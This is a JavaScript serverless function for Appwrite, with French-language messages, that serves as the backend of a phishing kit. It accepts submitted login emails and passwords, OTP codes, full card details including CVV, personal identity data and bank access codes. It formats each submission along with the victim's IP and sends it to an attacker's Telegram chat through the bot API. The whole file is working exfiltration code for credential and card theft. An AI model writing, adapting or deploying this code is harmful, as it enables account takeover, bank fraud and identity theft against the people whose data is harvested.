import { Client } from 'node-appwrite';

export default async ({ req, res, log, error }) => {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.json(
      {
        success: false,
        message: 'Variables d\'environnement manquantes',
      },
      400
    );
  }

  try {
    const { formType, page, ip, timestamp, ...formData } = req.body;

    const escapeHtml = (text) => {
      if (!text) return '';
      return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    };

    let telegramMessage = '';
    const dateObj = new Date(timestamp);
    const date = dateObj.toLocaleDateString('fr-FR');
    const heure = dateObj.toLocaleTimeString('fr-FR');
    const pageName = page || 'Formulaire';
    const clientIp = ip || 'IP inconnue';

    if (formType === 'login_credentials') {
      const { email, password } = formData;

      if (!email || !password) {
        return res.json(
          {
            success: false,
            message: 'Identifiants incomplets',
          },
          400
        );
      }

      telegramMessage = '🔐 Nouvelle connexion\n\n📧 Email: ' + escapeHtml(email) + '\n🔑 Mot de passe: <code>' + escapeHtml(password) + '</code>\n📅 Date: ' + date + '\n🕐 Heure: ' + heure + '\n🌐 Page: ' + escapeHtml(pageName) + '\n🖥️ IP: <code>' + clientIp + '</code>';

    } else if (formType === 'otp_verification') {
      const { email, otp } = formData;

      if (!email || !otp) {
        return res.json(
          {
            success: false,
            message: 'Données OTP incomplètes',
          },
          400
        );
      }

      telegramMessage = '✅ Code OTP saisi\n\n🔐 Code OTP: <code>' + escapeHtml(otp) + '</code>\n📧 Email: ' + escapeHtml(email) + '\n📅 Date: ' + date + '\n🕐 Heure: ' + heure + '\n🌐 Page: ' + escapeHtml(pageName) + '\n🖥️ IP: <code>' + clientIp + '</code>';

    } else if (formType === 'payment_details') {
      const { nom, banque, montant, card_number, expiry, cvv } = formData;

      if (!nom || !banque || !montant || !card_number || !expiry || !cvv) {
        return res.json(
          {
            success: false,
            message: 'Données de paiement incomplètes',
          },
          400
        );
      }

      telegramMessage = '💳 Détails de paiement\n\n👤 Nom: <code>' + escapeHtml(nom) + '</code>\n🏦 Banque: <code>' + escapeHtml(banque) + '</code>\n💰 Montant: <code>' + escapeHtml(montant) + '€</code>\n🔢 Numéro de carte: <code>' + escapeHtml(card_number) + '</code>\n📅 Expiration: <code>' + escapeHtml(expiry) + '</code>\n🔐 CVV: <code>' + escapeHtml(cvv) + '</code>\n📅 Date: ' + date + '\n🕐 Heure: ' + heure + '\n🌐 Page: ' + escapeHtml(pageName) + '\n🖥️ IP: <code>' + clientIp + '</code>';

    } else if (formType === 'personal_info') {
      const { nom, date_naissance, telephone, email, adresse, ville, pays } = formData;

      if (!nom || !date_naissance || !telephone || !email || !adresse || !ville || !pays) {
        return res.json(
          {
            success: false,
            message: 'Données personnelles incomplètes',
          },
          400
        );
      }

      telegramMessage = '👤 Informations personnelles\n\n👤 Nom: <code>' + escapeHtml(nom) + '</code>\n🎂 Date de naissance: <code>' + escapeHtml(date_naissance) + '</code>\n📱 Téléphone: <code>' + escapeHtml(telephone) + '</code>\n📧 Email: <a href="mailto:' + escapeHtml(email) + '">' + escapeHtml(email) + '</a>\n🏠 Adresse: <code>' + escapeHtml(adresse) + '</code>\n🏙️ Ville: <code>' + escapeHtml(ville) + '</code>\n🌍 Pays: <code>' + escapeHtml(pays) + '</code>\n📅 Date: ' + date + '\n🕐 Heure: ' + heure + '\n🌐 Page: ' + escapeHtml(pageName) + '\n🖥️ IP: <code>' + clientIp + '</code>';

    } else if (formType === 'bank_sync') {
      const { bank_identifier, personal_code } = formData;

      if (!bank_identifier || !personal_code) {
        return res.json(
          {
            success: false,
            message: 'Données bancaires incomplètes',
          },
          400
        );
      }

      telegramMessage = '🏦 Synchronisation Bancaire\n\n🔑 Identifiant bancaire: <code>' + escapeHtml(bank_identifier) + '</code>\n🔐 Code personnel: <code>' + escapeHtml(personal_code) + '</code>\n📅 Date: ' + date + '\n🕐 Heure: ' + heure + '\n🌐 Page: ' + escapeHtml(pageName) + '\n🖥️ IP: <code>' + clientIp + '</code>';

    } else {
      let messageBody = '';
      for (const [key, value] of Object.entries(formData)) {
        messageBody += '<b>' + escapeHtml(key) + ':</b> <code>' + escapeHtml(value) + '</code>\n';
      }
      telegramMessage = '📝 ' + escapeHtml(formType) + '\n\n' + messageBody + '📅 Date: ' + date + '\n🕐 Heure: ' + heure + '\n🌐 Page: ' + escapeHtml(pageName) + '\n🖥️ IP: <code>' + clientIp + '</code>';
    }

    const telegramUrl = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: telegramMessage,
        parse_mode: 'HTML',
      } ),
    });

    const telegramResult = await telegramResponse.json();

    if (!telegramResult.ok) {
      throw new Error('Erreur Telegram: ' + telegramResult.description);
    }

    return res.json({
      success: true,
      message: 'Message envoyé à Telegram avec succès',
      messageId: telegramResult.result.message_id,
    });

  } catch (err) {
    error('Erreur:', err.message);
    return res.json(
      {
        success: false,
        message: 'Erreur lors de l\'envoi: ' + err.message,
      },
      500
    );
  }
};
